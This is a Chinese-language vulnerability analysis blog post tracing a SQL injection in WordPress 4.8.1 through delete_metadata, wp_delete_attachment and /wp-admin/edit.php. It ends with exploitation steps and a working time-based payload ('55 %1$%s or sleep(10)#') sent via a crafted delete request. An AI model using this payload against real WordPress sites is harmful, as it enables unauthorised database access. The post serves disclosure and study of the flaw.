---
title: Wordpress SQL注入分析（二）
date: 2017-09-03 01:14:41
tags: 漏洞分析
---

作者：Ambulong@VulSpy

* [Wordpress SQL注入分析（一）](/2017/09/02/Wordpress-SQL-Injection-Analysis-1/)
* [Wordpress SQL注入分析（二）](/2017/09/03/Wordpress-SQL-Injection-Analysis-2/)

在上一篇文章 [Wordpress SQL注入分析（一）](/2017/09/05/Wordpress-SQL-Injection-Analysis-1/) 中，我们分析了Wordpress中的prepare函数在什么情况下会产生SQL注入漏洞。本篇文章将分析Wordpress中的一处SQL注入。

当前最新版：Wordpress 4.8.1

## 第三章：发现Wordpress中的SQL注入

### 3.1 SQL注入分析

在delete_metadata函数（文件：[/wp-includes/meta.php](https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L307)）中存在如下代码：

```php
function delete_metadata($meta_type, $object_id, $meta_key, $meta_value = '', $delete_all = false) {
	global $wpdb;
	if ( ! $meta_type || ! $meta_key || ! is_numeric( $object_id ) && ! $delete_all ) {
		return false;
	}
	$object_id = absint( $object_id );
	if ( ! $object_id && ! $delete_all ) {
		return false;
	}
	$table = _get_meta_table( $meta_type );
	if ( ! $table ) {
		return false;
	}
	$type_column = sanitize_key($meta_type . '_id');
	$id_column = 'user' == $meta_type ? 'umeta_id' : 'meta_id';
	// expected_slashed ($meta_key)
	$meta_key = wp_unslash($meta_key);
	$meta_value = wp_unslash($meta_value);
	
	$check = apply_filters( "delete_{$meta_type}_metadata", null, $object_id, $meta_key, $meta_value, $delete_all );
	if ( null !== $check )
		return (bool) $check;
	$_meta_value = $meta_value;
	$meta_value = maybe_serialize( $meta_value );
	$query = $wpdb->prepare( "SELECT $id_column FROM $table WHERE meta_key = %s", $meta_key );
	if ( !$delete_all )
		$query .= $wpdb->prepare(" AND $type_column = %d", $object_id );
	if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value )
		$query .= $wpdb->prepare(" AND meta_value = %s", $meta_value );
	$meta_ids = $wpdb->get_col( $query );
	if ( !count( $meta_ids ) )
		return false;
	if ( $delete_all ) {
		$value_clause = '';
		if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value ) {
=>			$value_clause = $wpdb->prepare( " AND meta_value = %s", $meta_value );
		}
=>		$object_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s $value_clause", $meta_key ) );
	}
	...//ignore
}
```

我们来看下关键部分代码：

```php
if ( $delete_all ) {
	$value_clause = '';
	if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value ) {
=>		$value_clause = $wpdb->prepare( " AND meta_value = %s", $meta_value );
	}
=>	$object_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s $value_clause", $meta_key ) );
}
```

按我们上一篇文章的分析，若`$meta_value`可控，此处就存在SQL注入漏洞。而`$meta_value`变量是作为参数从外部传进来的，所以我们需要查找调用到delete_metadata函数，且第四个参数可控的地方。

我们此处直接选用[@slavco](https://medium.com/@slavco)[文章](https://medium.com/websec/wordpress-sqli-bbb2afcc8e94)中的wp_delete_attachment函数（文件：[/wp-includes/post.php](https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/post.php#L4864)），代码如下：

```php
function wp_delete_attachment( $post_id, $force_delete = false ) {
	global $wpdb;
	if ( !$post = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->posts WHERE ID = %d", $post_id) ) )
		return $post;
	if ( 'attachment' != $post->post_type )
		return false;
	if ( !$force_delete && EMPTY_TRASH_DAYS && MEDIA_TRASH && 'trash' != $post->post_status )
		return wp_trash_post( $post_id );
	delete_post_meta($post_id, '_wp_trash_meta_status');
	delete_post_meta($post_id, '_wp_trash_meta_time');
	$meta = wp_get_attachment_metadata( $post_id );
	$backup_sizes = get_post_meta( $post->ID, '_wp_attachment_backup_sizes', true );
	$file = get_attached_file( $post_id );
	if ( is_multisite() )
		delete_transient( 'dirsize_cache' );

	do_action( 'delete_attachment', $post_id );
	wp_delete_object_term_relationships($post_id, array('category', 'post_tag'));
	wp_delete_object_term_relationships($post_id, get_object_taxonomies($post->post_type));
	// Delete all for any posts.
=>	delete_metadata( 'post', null, '_thumbnail_id', $post_id, true );
	...//ignore
}
```

关键代码：

```php
delete_metadata( 'post', null, '_thumbnail_id', $post_id, true );
```

里面的$post_id同样从外部传入，所以我们继续查找调用到wp_delete_attachment函数，且第一个参数可控的地方。

在文件[/wp-admin/edit.php](https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-admin/edit.php#L143)中有个比较明显的调用点，且$post_id（即：wp_delete_attachment函数的第一个参数）可控。
```php
case 'delete':
	$deleted = 0;
	foreach ( (array) $post_ids as $post_id ) {
		$post_del = get_post($post_id);
		if ( !current_user_can( 'delete_post', $post_id ) )
			wp_die( __('Sorry, you are not allowed to delete this item.') );
		if ( $post_del->post_type == 'attachment' ) {
=>			if ( ! wp_delete_attachment($post_id) )
				wp_die( __('Error in deleting.') );
		} else {
			if ( !wp_delete_post($post_id) )
				wp_die( __('Error in deleting.') );
		}
		$deleted++;
	}
	$sendback = add_query_arg('deleted', $deleted, $sendback);
	break;
```

### 3.2 利用条件分析

我们首先简单地整理下相关文件/函数的调用过程与调用条件。

**1. 文件：[/wp-admin/edit.php](https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-admin/edit.php#L143)**

```php
...//ignore
$doaction = $wp_list_table->current_action();
if ( $doaction ) {
	check_admin_referer('bulk-posts');
	...//ignore
	} elseif ( isset( $_REQUEST['media'] ) ) {
		$post_ids = $_REQUEST['media'];
	} elseif ( isset( $_REQUEST['ids'] ) ) {
		$post_ids = explode( ',', $_REQUEST['ids'] );
	} elseif ( !empty( $_REQUEST['post'] ) ) {
		$post_ids = array_map('intval', $_REQUEST['post']);
	}
	if ( !isset( $post_ids ) ) {
		wp_redirect( $sendback );
		exit;
	}
	switch ( $doaction ) {
		...//ignore
		case 'delete':
			$deleted = 0;
			foreach ( (array) $post_ids as $post_id ) {
				$post_del = get_post($post_id);
				if ( !current_user_can( 'delete_post', $post_id ) )
					wp_die( __('Sorry, you are not allowed to delete this item.') );
				if ( $post_del->post_type == 'attachment' ) {
					if ( ! wp_delete_attachment($post_id) )
						wp_die( __('Error in deleting.') );
				} else {
					if ( !wp_delete_post($post_id) )
						wp_die( __('Error in deleting.') );
				}
				$deleted++;
			}
			...//ignore
```

**需满足条件：**
* **$doaction = $wp_list_table->current_action() = 'delete'**
	即：$_REQUEST['action'] = 'delete'
* **通过check_admin_referer('bulk-posts')**
	检查$_REQUEST['_wpnonce']
* **$post_ids = $_REQUEST['media'] = '%1$%s abc'**
	传入测试注入字符串
* **current_user_can( 'delete_post', $post_id ) == true**
	当前用户是否有删除该文章权限
* **$post_del->post_type == 'attachment'**
	该文章类型为attachment，可通过添加媒体功能添加

**2. 文件：[/wp-includes/post.php](https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/post.php#L4864)**

```php
...//ignore
function wp_delete_attachment( $post_id, $force_delete = false ) {
	global $wpdb;
	if ( !$post = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->posts WHERE ID = %d", $post_id) ) )
		return $post;
	if ( 'attachment' != $post->post_type )
		return false;
	if ( !$force_delete && EMPTY_TRASH_DAYS && MEDIA_TRASH && 'trash' != $post->post_status )
		return wp_trash_post( $post_id );
	...//ignore
	delete_metadata( 'post', null, '_thumbnail_id', $post_id, true );
...//ignore
```

**需满足条件：**
* **$post_id对应的文章存在**
	因为有类型转换，所以可以用`$post_id = '123 %1$%s abc'`绕过。（转换为整数后`$post_id = 123`）
* **$post_id对应的文章类型为attachment**

**3. 文件：[/wp-includes/meta.php](https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L307)**

```php
...//ignore
function delete_metadata($meta_type, $object_id, $meta_key, $meta_value = '', $delete_all = false) {
	global $wpdb;
	if ( ! $meta_type || ! $meta_key || ! is_numeric( $object_id ) && ! $delete_all ) {
		return false;
	}
	...//ignore
	$meta_key = wp_unslash($meta_key);
	$meta_value = wp_unslash($meta_value);

	$check = apply_filters( "delete_{$meta_type}_metadata", null, $object_id, $meta_key, $meta_value, $delete_all );
	if ( null !== $check )
		return (bool) $check;
	$_meta_value = $meta_value;
	$meta_value = maybe_serialize( $meta_value );
	$query = $wpdb->prepare( "SELECT $id_column FROM $table WHERE meta_key = %s", $meta_key );
	if ( !$delete_all )
		$query .= $wpdb->prepare(" AND $type_column = %d", $object_id );
	if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value )
		$query .= $wpdb->prepare(" AND meta_value = %s", $meta_value );
	$meta_ids = $wpdb->get_col( $query );
	if ( !count( $meta_ids ) )
		return false;
	if ( $delete_all ) {
		$value_clause = '';
		if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value ) {
			$value_clause = $wpdb->prepare( " AND meta_value = %s", $meta_value );
		}
		$object_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s $value_clause", $meta_key ) );
	}
...//ignore
```
**需满足条件：**
* **"SELECT meta_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = 'xxx'"存在**
	即：需要使得wp_postmeta表内的_thumbnail_id的内容与我们的SQL语句一样（即内容为'123 %2$%s abc'）。

**wp_postmeta表内的meta_key和meta_value字段是可通过`写文章`功能内的`自定义栏目`添加的。但是禁止添加名称以`下划线`开头的自定义栏目，所以正常情况下我们无法添加_thumbnail_id栏目。**

关于如果绕过`下划线`检查添加post meta，请见下一篇文章：

* [Wordpress POST META_NAME校验绕过](/2017/09/05/Wordpress-POST-META-Check-Bypass/)

### 3.3 SQL注入漏洞利用

1. 添加媒体（/wp-admin/media-new.php），并记住媒体ID（这里的ID是55）。

{% asset_img 4.1.1.png 添加媒体 %}

2. 获取_wpnonce。
打开`/wp-admin/edit.php?post_type=post`，找到posts-filter内的_wpnonce（这里的_wpnonce是301ee97c09）

{% asset_img 4.2.1.png 添加媒体 %}

3. 添加/修改POST META，使存在meta_key为'_thumbnail_id'的meta_value为`'55 %1$%s or sleep(10)#'`

4. 访问`/wp-admin/edit.php?action=delete&_wpnonce=301ee97c09&ids=55 %1$%s or sleep(10)#`，触发SQL注入漏洞


